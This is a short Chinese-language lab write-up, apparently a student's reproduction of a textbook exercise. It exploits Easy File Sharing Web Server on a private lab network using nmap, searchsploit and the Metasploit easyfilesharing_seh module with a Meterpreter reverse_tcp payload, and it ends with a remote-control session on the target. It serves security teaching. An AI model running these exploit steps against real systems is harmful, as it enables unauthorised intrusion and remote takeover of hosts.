![](images/vulnerability-scan-reproduction/1.png)

`nmap -sV 192.168.140.1`
![](images/vulnerability-scan-reproduction/2.png)

3.在自带的火狐浏览器登录192.168.140.1，确定软件已经启动：
![](images/vulnerability-scan-reproduction/3.png)

输入命令:
`searchsploit Easy File Sharing`
![](images/vulnerability-scan-reproduction/4.png)

5.获得文件名及地址后，利用python脚本进行攻击

![](images/vulnerability-scan-reproduction/5.png)

# 课本7.4复现
1.打开Easy File Sharing Web Searver,启动该软件。

2.kali里找到Metasploit，启动它。
启动成功后，输入命令:
`search EasyFileSharing`
![](images/vulnerability-scan-reproduction/7.png)
得到几个模块。

3.启动easyfilesharing_seh模块：
输入命令：
`use exploit/windows/http/easyfilesharing_seh`
并输入`show options`查看参数：
![](images/vulnerability-scan-reproduction/8.png)

4.接下来设置攻击载荷，使用`reverse_tcp`
一串串输入命令：
```
msf exploit (easyfilesharing_seh)>set payload windows/meterpreter/reverse_tcp
msf exploit (easyfilesharing_seh)>set lhost 192.168.140.0
msf exploit (easyfilesharing_seh)>set rhost 192.168.140.1
msf exploit (easyfilesharing_seh)>set rport 8000
msf exploit (easyfilesharing_seh)>exploit
```
如图：
![](images/vulnerability-scan-reproduction/9.png)

可以看到我们已经打开了一个会话，实现了对目标主机的控制。并且已经获得了一个Meterpreter，利用它就可以完成对目标主机的远程控制。
